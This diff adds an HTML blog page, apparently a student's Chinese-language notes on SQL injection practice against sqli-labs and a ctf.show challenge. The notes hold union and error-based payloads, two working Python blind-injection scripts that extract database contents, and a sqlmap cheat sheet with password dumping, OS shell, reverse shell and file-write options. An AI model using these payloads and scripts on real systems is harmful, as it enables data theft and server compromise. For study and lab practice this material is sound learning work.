@@ -1,0 +1,661 @@
+
+    <!DOCTYPE html>
+    <html lang="en"
+            
+          
+    >
+    <head>
+    <meta charset="utf-8">
+    
+
+    
+
+    
+    <title>
+        sql注入 |
+        
+        Hexo</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CUbuntu%20Mono:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+    
+<link rel="stylesheet" href="https://unpkg.com/@fortawesome/fontawesome-free/css/v4-font-face.min.css">
+
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+    <meta name="description" content="一、在火狐浏览器添加拓展hackbar准备📎hackbar-2.3.1-fx.xpi.zip 步骤： 解压hackbar压缩包    打开火狐浏览器    打开扩展，从文件安装添加拓展    选择hackbar文件    添加成功后，显示如图   ​                                                                      二、sq">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入">
+<meta property="og:url" content="http://example.com/2023/12/24/sql%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、在火狐浏览器添加拓展hackbar准备📎hackbar-2.3.1-fx.xpi.zip 步骤： 解压hackbar压缩包    打开火狐浏览器    打开扩展，从文件安装添加拓展    选择hackbar文件    添加成功后，显示如图   ​                                                                      二、sq">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069625151-b83aa1bb-10ca-48c4-90d9-c9e9f6be84da.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069688300-b7a603d2-d885-4dfb-9a5c-dde09d657afc.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069750179-fe5bc20e-1cd6-48d9-b5ea-46b563d5db2a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069848695-4faa3b3a-bccf-4d3f-8cca-d9f512e0e69e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069908013-7031cecd-4a59-407b-b185-5b3f1edfa195.png">
+<meta property="article:published_time" content="2023-12-24T01:01:44.000Z">
+<meta property="article:modified_time" content="2023-12-24T01:24:27.191Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069625151-b83aa1bb-10ca-48c4-90d9-c9e9f6be84da.png">
+    
+        <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+    
+    
+        <link rel="shortcut icon" href="/images/favicon.ico">
+    
+    
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+    
+    
+    
+    
+    
+<script src="https://unpkg.com/pace-js@1.2.4/pace.min.js"></script>
+
+    
+        
+<link rel="stylesheet" href="https://unpkg.com/wowjs@1.1.3/css/libs/animate.css">
+
+        
+<script src="https://unpkg.com/wowjs@1.1.3/dist/wow.min.js"></script>
+
+        <script>
+          new WOW({
+            offset: 0,
+            mobile: true,
+            live: false
+          }).init();
+        </script>
+    
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+    <body>
+    
+<div id='loader'>
+  <div class="loading-left-bg"></div>
+  <div class="loading-right-bg"></div>
+  <div class="spinner-box">
+    <div class="loading-taichi">
+      <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+      <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="#ff6e6b" />
+      <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z" fill="#fd0d00" />
+      <path d="M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95" fill="#fd0d00" />
+    </svg>
+    </div>
+    <div class="loading-word">少女祈祷中...</div>
+  </div>
+</div>
+</div>
+
+<script>
+  const endLoading = function() {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('load', endLoading);
+  document.getElementById('loader').addEventListener('click', endLoading);
+</script>
+
+
+    <div id="container">
+        <div id="wrap">
+            <header id="header">
+    
+        <img data-src="/images/banner.jpg" data-sizes="auto" alt="sql注入" class="lazyload">
+    
+    <div id="header-outer" class="outer">
+        <div id="header-title" class="inner">
+            <div id="logo-wrap">
+                
+                    
+                    
+                        <a href="/" id="logo"><h1>sql注入</h1></a>
+                    
+                
+            </div>
+            
+                
+                
+            
+        </div>
+        <div id="header-inner">
+            <nav id="main-nav">
+                <a id="main-nav-toggle" class="nav-icon"></a>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/">Home</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/archives">Archives</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/about">About</a>
+                    </span>
+                
+                    <span class="main-nav-link-wrap">
+                        <span class="main-nav-icon"></span>
+                        <a class="main-nav-link" href="/friend">Friend</a>
+                    </span>
+                
+            </nav>
+            <nav id="sub-nav">
+                
+                    <a id="nav-rss-link" class="nav-icon" href="/atom.xml"
+                       title="RSS Feed"></a>
+                
+                
+            </nav>
+            <div id="search-form-wrap">
+                <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+            </div>
+        </div>
+    </div>
+</header>
+
+            <div id="content" class="outer">
+                <section id="main"><article id="post-sql注入" class="h-entry article article-type-post"
+         itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+    <div class="article-inner">
+        <div class="article-meta">
+            <div class="article-date wow slideInLeft">
+    <a href="/2023/12/24/sql%E6%B3%A8%E5%85%A5/" class="article-date-link">
+        <time datetime="2023-12-24T01:01:44.000Z"
+              itemprop="datePublished">2023-12-24</time>
+    </a>
+</div>
+
+            
+
+        </div>
+        <div class="hr-line"></div>
+        
+
+        <div class="e-content article-entry" itemprop="articleBody">
+            
+                <h1 id="一、在火狐浏览器添加拓展hackbar"><a href="#一、在火狐浏览器添加拓展hackbar" class="headerlink" title="一、在火狐浏览器添加拓展hackbar"></a>一、在火狐浏览器添加拓展hackbar</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p><a target="_blank" rel="noopener" href="https://www.yuque.com/attachments/yuque/0/2023/zip/40675992/1703069562676-33b0f2fb-009c-4a9c-9348-411d4e249730.zip">📎hackbar-2.3.1-fx.xpi.zip</a></p>
+<h2 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h2><ol>
+<li>解压hackbar压缩包</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069625151-b83aa1bb-10ca-48c4-90d9-c9e9f6be84da.png" alt="img"></p>
+<ol>
+<li>打开火狐浏览器</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069688300-b7a603d2-d885-4dfb-9a5c-dde09d657afc.png" alt="img"></p>
+<ol>
+<li>打开扩展，从文件安装添加拓展</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069750179-fe5bc20e-1cd6-48d9-b5ea-46b563d5db2a.png" alt="img"></p>
+<ol>
+<li>选择hackbar文件</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069848695-4faa3b3a-bccf-4d3f-8cca-d9f512e0e69e.png" alt="img"></p>
+<ol>
+<li>添加成功后，显示如图</li>
+</ol>
+<p><img src="https://raw.githubusercontent.com/taijia12/tuchuang/main/image/1703069908013-7031cecd-4a59-407b-b185-5b3f1edfa195.png" alt="img"></p>
+<p>​                                                                     </p>
+<h1 id="二、sql注入相关知识w"><a href="#二、sql注入相关知识w" class="headerlink" title="二、sql注入相关知识w"></a>二、sql注入相关知识w</h1><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p><a target="_blank" rel="noopener" href="http://192.168.0.109:83/Less-1/?id=2">http://192.168.0.109:83/Less-1/?id=2</a>‘ and 1&#x3D;2 union select 1,group_concat(schema_name),3 from information_schema.schemata   爆数据库</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=-1%27union">http://192.168.2.70/sqli/Less-1/?id=-1&#39;union</a> select 1,group_concat(table_name) ,3 from information_schema.tables where table_schema&#x3D;database()– -  爆表名</p>
+<p>select 1,group_concat(column_name) ,3 from information_schema.columns where table_name&#x3D;’users’ and table_schema&#x3D;database();  爆字段</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=-1%27union">http://192.168.2.70/sqli/Less-1/?id=-1&#39;union</a> select 1,group_concat(id,”<del>“,username,”</del>“,password),3 from users;– -     爆内容</p>
+<h3 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h3><p>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</p>
+<p>(extractvalue(1,concat(0x7e,(select user()),0x7e)))</p>
+<p>(updatexml(1,concat(0x7e,(select user()),0x7e),1))</p>
+<p>exp(~(select * from(select user())a))</p>
+<p>geometrycollection((select * from(select * from(select user())a)b))</p>
+<p>multipoint((select * from(select * from(select user())a)b))</p>
+<p>polygon((select * from(select * from(select user())a)b))</p>
+<p>multipolygon((select * from(select * from(select user())a)b))</p>
+<p>linestring((select * from(select * from(select user())a)b))</p>
+<p>multilinestring((select * from(select * from(select user())a)b))</p>
+<p>把select user()改成要查的语句</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>延时注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">session = requests.session()</span><br><span class="line">url = <span class="string">&quot;http://192.168.2.4/sqli/Less-9/?id=11&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        begin = <span class="number">32</span></span><br><span class="line">        end = <span class="number">128</span></span><br><span class="line">        tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        threshold = <span class="number">0.05</span></span><br><span class="line">        <span class="keyword">while</span> begin &lt; end:</span><br><span class="line">            start_time = time.time()</span><br><span class="line">            paramsGet = (</span><br><span class="line">                url</span><br><span class="line">                + <span class="string">&quot;/**/and/**/If(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(0.1),1)--+&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                <span class="comment"># + &quot;/**/and/**/If(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format(</span></span><br><span class="line">                <span class="comment"># + &quot;/**/and/**/If(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format(</span></span><br><span class="line">                <span class="comment"># + &quot;/**/and/**/If(ascii(substr((select group_concat(username,password) from users),&#123;0&#125;,1))&gt;&#123;1&#125;,sleep(1),1)--+&quot;.format(</span></span><br><span class="line">                    i, tmp</span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">            session.get(paramsGet)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            elapsed_time = end_time - start_time</span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;= threshold:</span><br><span class="line">                begin = tmp + <span class="number">1</span></span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = tmp</span><br><span class="line">                tmp = (begin + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">32</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name += <span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db()</span><br></pre></td></tr></table></figure>
+
+<p>bool注入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">session=requests.session()</span><br><span class="line">url=<span class="string">&quot;http://4cd4bfb2-24b0-4483-83bf-bad37a9a29b5.challenge.ctf.show/select-no-waf-4.php/?id=1&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    name=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        begin=<span class="number">32</span></span><br><span class="line">        end=<span class="number">128</span></span><br><span class="line">        tmp=(begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> begin&lt;end:</span><br><span class="line">            paramsGet=url+<span class="string">&quot;/**/and/**/ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;--+&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br><span class="line">            response=session.get(paramsGet)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;You are in.........&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                begin=tmp+<span class="number">1</span></span><br><span class="line">                tmp=(begin+end)//<span class="number">2</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end=tmp</span><br><span class="line">                tmp=(begin+end)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(tmp==<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        name+=<span class="built_in">chr</span>(tmp)</span><br><span class="line">        <span class="built_in">print</span>(name)</span><br><span class="line">db()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h3><p>python3 sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=1">http://192.168.2.70/sqli/Less-1/?id=1</a>“ –dbs         爆数据库</p>
+<p>╰─➤  python3 sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=1">http://192.168.2.70/sqli/Less-1/?id=1</a>“  –batch -D security –tables      爆表</p>
+<p> –batch -D security -T users –columns  爆字段</p>
+<p>python3 sqlmap.py  -u “<a target="_blank" rel="noopener" href="http://192.168.2.70/sqli/Less-1/?id=1">http://192.168.2.70/sqli/Less-1/?id=1</a>“  –batch -D security -T users -C “id,username” –dump      爆内容</p>
+<p>基本操作笔记：</p>
+<p>-u #注入点</p>
+<p>-f #指纹判别数据库类型</p>
+<p>-b #获取数据库版本信息</p>
+<p>-p #指定可测试的参数(?page&#x3D;1&amp;id&#x3D;2 -p “page,id”)</p>
+<p>-D “”  #指定数据库名</p>
+<p>-T “”  #指定表名</p>
+<p>-C “”  #指定字段</p>
+<p>-s “”  #保存注入过程到一个文件，还可中断，下次恢复在注入(保存：-s “xx.log” 恢复：-s “xx.log” –resume)</p>
+<p>–level&#x3D;(1-5) #要执行的测试水平等级，默认为1</p>
+<p>–risk&#x3D;(0-3) #测试执行的风险等级，默认为1</p>
+<p>–time-sec&#x3D;(2,5) #延迟响应，默认为5</p>
+<p>–data #通过POST发送数据</p>
+<p>–columns #列出字段</p>
+<p>–current-user #获取当前用户名称</p>
+<p>–current-db #获取当前数据库名称</p>
+<p>–users #列数据库所有用户</p>
+<p>–passwords #数据库用户所有密码</p>
+<p>–privileges #查看用户权限(–privileges -U root)</p>
+<p>-U #指定数据库用户</p>
+<p>–dbs #列出所有数据库</p>
+<p>–tables -D “” #列出指定数据库中的表</p>
+<p>–columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段</p>
+<p>–dump-all #列出所有数据库所有表</p>
+<p>–exclude-sysdbs 只列出用户自己新建的数据库和表</p>
+<p>–dump -T “” -D “” -C “”  #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname)</p>
+<p>–dump -T “” -D “” –start 2 –top 4  #列出指定数据库的表的2-4字段的数据</p>
+<p>–dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB)</p>
+<p>–os #指定系统(Linux,Windows)</p>
+<p>-v #详细的等级(0-6)</p>
+<p>​    0：只显示Python的回溯，错误和关键消息</p>
+<p>​    1：显示信息和警告消息</p>
+<p>​    2：显示调试消息</p>
+<p>​    3：有效载荷注入</p>
+<p>​    4：显示HTTP请求</p>
+<p>​    5：显示HTTP响应头</p>
+<p>​    6：显示HTTP响应页面的内容</p>
+<p>–privileges #查看权限</p>
+<p>–is-dba #是否是数据库管理员</p>
+<p>–roles #枚举数据库用户角色</p>
+<p>–udf-inject #导入用户自定义函数（获取系统权限）</p>
+<p>–union-check #是否支持union注入</p>
+<p>–union-cols #union查询表记录</p>
+<p>–union-test #union语句测试</p>
+<p>–union-use #采用union注入</p>
+<p>–union-tech orderby #union配合order by</p>
+<p>–data “”  #POST方式提交数据(–data “page&#x3D;1&amp;id&#x3D;2”)</p>
+<p>–cookie “用;号分开” #cookie注入(–cookies&#x3D;”PHPSESSID&#x3D;mvijocbglq6pi463rlgk1e4v52; security&#x3D;low”)</p>
+<p>–referer “” #使用referer欺骗(–referer “<a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a>“)</p>
+<p>–user-agent “”  #自定义user-agent</p>
+<p>–proxy “<a target="_blank" rel="noopener" href="http://127.0.0.1:8118/">http://127.0.0.1:8118</a>“ #代理注入</p>
+<p>–string&#x3D;”” #指定关键词,字符串匹配</p>
+<p>–threads  #采用多线程(–threads 3)</p>
+<p>–sql-shell  #执行指定sql命令</p>
+<p>–sql-query #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user &#x3D; ‘root’ LIMIT 0, 1” )</p>
+<p>–file-read #读取指定文件</p>
+<p>–file-write #写入本地文件(–file-write &#x2F;test&#x2F;test.txt –file-dest &#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt;将本地的test.txt文件写入到目标的1.txt)</p>
+<p>–file-dest  #要写入的文件绝对路径</p>
+<p>–os-cmd&#x3D;id #执行系统命令</p>
+<p>–os-shell  #系统交互shell</p>
+<p>–os-pwn  #反弹shell(–os-pwn –msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)</p>
+<p>–msf-path&#x3D; #matesploit绝对路径(–msf-path&#x3D;&#x2F;opt&#x2F;framework&#x2F;msf3&#x2F;)</p>
+<p>–os-smbrelay #</p>
+<p>–os-bof  #</p>
+<p>–reg-read #读取win系统注册表</p>
+<p>–priv-esc  #</p>
+<p>–time-sec&#x3D; #延迟设置 默认–time-sec&#x3D;5 为5秒</p>
+<p>-p “user-agent” –user-agent “sqlmap&#x2F;0.7rc1 (<a target="_blank" rel="noopener" href="http://sqlmap.sourceforge.net/">http://sqlmap.sourceforge.net</a>)” #指定user-agent注入</p>
+<p>–eta  #盲注</p>
+<p>&#x2F;pentest&#x2F;database&#x2F;sqlmap&#x2F;txt&#x2F;</p>
+<p>common-columns.txt 字段字典</p>
+<p>common-outputs.txt</p>
+<p>common-tables.txt  表字典</p>
+<p>keywords.txt</p>
+<p>oracle-default-passwords.txt</p>
+<p>user-agents.txt</p>
+<p>wordlist.txt</p>
+<p>简单的注入流程：</p>
+<p>1.读取数据库版本，当前用户，当前数据库</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db -v 1</p>
+<p>2.判断当前数据库用户权限</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –privileges -U 用户名 -v 1</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –is-dba -U 用户名 -v 1</p>
+<p>3.读取所有数据库用户或指定数据库用户的密码</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –users –passwords -v 2</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –passwords -U root -v 2</p>
+<p>4.获取所有数据库</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dbs -v 2</p>
+<p>5.获取指定数据库中的所有表</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –tables -D mysql -v 2</p>
+<p>6.获取指定数据库名中指定表的字段</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –columns -D mysql -T users -v 2</p>
+<p>7.获取指定数据库名中指定表中指定字段的数据</p>
+<p>sqlmap -u <a target="_blank" rel="noopener" href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2</p>
+
+            
+        </div>
+        <footer class="article-footer">
+            <a data-url="http://example.com/2023/12/24/sql%E6%B3%A8%E5%85%A5/" data-id="clqiteyw70001jovl1vt1gwj2" data-title="sql注入"
+               class="article-share-link">Share</a>
+            
+            
+            
+            
+
+        </footer>
+    </div>
+    
+        
+    <nav id="article-nav" class="wow fadeInUp">
+        
+            <div class="article-nav-link-wrap article-nav-link-left">
+                
+                    
+                    
+                        <img data-src="/images/banner.jpg" data-sizes="auto" alt="打靶笔记"
+                             class="lazyload">
+                    
+                
+                <a href="/2023/12/24/%E6%89%93%E9%9D%B6%E7%AC%94%E8%AE%B0/"></a>
+                <div class="article-nav-caption">Newer</div>
+                <h3 class="article-nav-title">
+                    
+                        打靶笔记
+                    
+                </h3>
+            </div>
+        
+        
+            <div class="article-nav-link-wrap article-nav-link-right">
+                
+                    
+                    
+                        <img data-src="/images/banner.jpg" data-sizes="auto" alt="图书管理系统实现"
+                             class="lazyload">
+                    
+                
+                <a href="/2023/12/16/%E5%9B%BE%E4%B9%A6%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AE%9E%E7%8E%B0/"></a>
+                <div class="article-nav-caption">Older</div>
+                <h3 class="article-nav-title">
+                    
+                        图书管理系统实现
+                    
+                </h3>
+            </div>
+        
+    </nav>
+
+
+    
+</article>
+
+
+
+
+
+
+
+
+
+
+
+</section>
+                
+                    <aside id="sidebar">
+    <div class="sidebar-wrap wow fadeInRight">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+            <div class="sidebar-author-name">John Doe</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">17</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
+                    <a href=https://github.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-google>
+                    <a href=https://plus.google.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-twitter>
+                    <a href=https://twitter.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+                <div class=icon-facebook>
+                    <a href=https://www.facebook.com/yourname itemprop="url" target="_blank"></a>
+                </div>
+            
+        </div>
+        <div class="sidebar-menu">
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Home</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/archives"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Archives</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/about"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">About</div>
+                </div>
+            
+                <div class="sidebar-menu-link-wrap">
+                    <a class="sidebar-menu-link-dummy" href="/friend"></a>
+                    <span class="sidebar-menu-icon"></span>
+                    <div class="sidebar-menu-link">Friend</div>
+                </div>
+            
+        </div>
+    </div>
+    
+        
+
+    
+        
+
+    
+        
+    <div class="widget-wrap wow fadeInRight">
+        <h3 class="widget-title">Archives</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li></ul>
+        </div>
+    </div>
+
+
+    
+</aside>
+
+                
+            </div>
+            <footer id="footer" class="wow fadeInUp">
+    <div style="width: 100%; overflow: hidden"><div class="footer-line"></div></div>
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            
+            <div>
+                <span class="icon-copyright"></span>
+                2020-2023
+                <span class="footer-info-sep"></span>
+                John Doe
+            </div>
+            
+                <div>
+                    Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
+                    Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
+                </div>
+            
+            
+                <div>
+                    <span class="icon-brush"></span>
+                    18.2k
+                    &nbsp;|&nbsp;
+                    <span class="icon-coffee"></span>
+                    01:16
+                </div>
+            
+            
+                <div>
+                    <span class="icon-eye"></span>
+                    <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+                    &nbsp;|&nbsp;
+                    <span class="icon-user"></span>
+                    <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+                </div>
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+        <nav id="mobile-nav">
+    <div class="sidebar-wrap">
+        <div class="sidebar-author">
+            <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
+            <div class="sidebar-author-name">John Doe</div>
+            <div class="sidebar-description"></div>
+        </div>
+        <div class="sidebar-state">
+            <div class="sidebar-state-article">
+                <div>Posts</div>
+                <div class="sidebar-state-number">17</div>
+            </div>
+            <div class="sidebar-state-category">
+                <div>Categories</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+            <div class="sidebar-state-tag">
+                <div>Tags</div>
+                <div class="sidebar-state-number">0</div>
+            </div>
+        </div>
+        <div class="sidebar-social">
+            
+                <div class=icon-github>
